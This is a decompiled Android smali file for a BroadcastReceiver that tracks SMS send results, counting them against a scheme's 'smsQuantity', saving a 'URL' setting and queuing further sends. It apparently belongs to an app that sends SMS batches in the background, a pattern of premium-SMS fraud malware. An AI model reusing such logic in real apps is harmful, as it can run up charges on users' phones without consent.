.class Lcom/software/application/Actor$1;
.super Landroid/content/BroadcastReceiver;
.source "Actor.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/software/application/Actor;->acquire()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/software/application/Actor;


# direct methods
.method constructor <init>(Lcom/software/application/Actor;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    .line 454
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 6
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "i"    # Landroid/content/Intent;

    .prologue
    const/4 v5, 0x0

    const/4 v4, -0x1

    .line 457
    iget-object v0, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v0}, Lcom/software/application/Actor;->access$0(Lcom/software/application/Actor;)I

    move-result v1

    add-int/lit8 v1, v1, 0x1

    invoke-static {v0, v1}, Lcom/software/application/Actor;->access$1(Lcom/software/application/Actor;I)V

    .line 458
    invoke-virtual {p0}, Lcom/software/application/Actor$1;->getResultCode()I

    move-result v0

    packed-switch v0, :pswitch_data_0

    .line 465
    :goto_0
    iget-object v0, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v0}, Lcom/software/application/Actor;->access$0(Lcom/software/application/Actor;)I

    move-result v1

    iget-object v0, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v0}, Lcom/software/application/Actor;->access$4(Lcom/software/application/Actor;)Ljava/util/HashMap;

    move-result-object v0

    invoke-static {}, Lcom/software/application/Actor;->access$5()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/software/application/Scheme;

    iget v0, v0, Lcom/software/application/Scheme;->smsQuantity:I

    if-ne v1, v0, :cond_0

    .line 466
    iget-object v0, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v0}, Lcom/software/application/Actor;->access$2(Lcom/software/application/Actor;)I

    move-result v0

    if-lez v0, :cond_1

    .line 467
    iget-object v0, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v0}, Lcom/software/application/Actor;->access$6(Lcom/software/application/Actor;)Landroid/content/Context;

    move-result-object v0

    const-string v1, "URL"

    iget-object v2, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v2}, Lcom/software/application/Actor;->access$7(Lcom/software/application/Actor;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v3}, Lcom/software/application/Actor;->access$8(Lcom/software/application/Actor;)Landroid/content/SharedPreferences;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/software/application/TextUtils;->putSettingsValue(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Landroid/content/SharedPreferences;)V

    .line 468
    iget-object v0, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    iget-object v1, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v1}, Lcom/software/application/Actor;->access$6(Lcom/software/application/Actor;)Landroid/content/Context;

    move-result-object v1

    .line 469
    new-instance v2, Landroid/content/Intent;

    const-string v3, "SENDING_OK"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 468
    invoke-static {v1, v4, v2, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    invoke-static {v0, v4, v1}, Lcom/software/application/Actor;->access$9(Lcom/software/application/Actor;ILandroid/app/PendingIntent;)V

    .line 474
    :goto_1
    iget-object v0, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v0}, Lcom/software/application/Actor;->access$6(Lcom/software/application/Actor;)Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0, p0}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 476
    :cond_0
    return-void

    .line 460
    :pswitch_0
    iget-object v0, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v0}, Lcom/software/application/Actor;->access$2(Lcom/software/application/Actor;)I

    move-result v1

    add-int/lit8 v1, v1, 0x1

    invoke-static {v0, v1}, Lcom/software/application/Actor;->access$3(Lcom/software/application/Actor;I)V

    goto :goto_0

    .line 471
    :cond_1
    iget-object v0, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    iget-object v1, p0, Lcom/software/application/Actor$1;->this$0:Lcom/software/application/Actor;

    invoke-static {v1}, Lcom/software/application/Actor;->access$6(Lcom/software/application/Actor;)Landroid/content/Context;

    move-result-object v1

    .line 472
    new-instance v2, Landroid/content/Intent;

    const-string v3, "SENDING_OK"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 471
    invoke-static {v1, v4, v2, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    invoke-static {v0, v5, v1}, Lcom/software/application/Actor;->access$9(Lcom/software/application/Actor;ILandroid/app/PendingIntent;)V

    goto :goto_1

    .line 458
    :pswitch_data_0
    .packed-switch -0x1
        :pswitch_0
    .end packed-switch
.end method
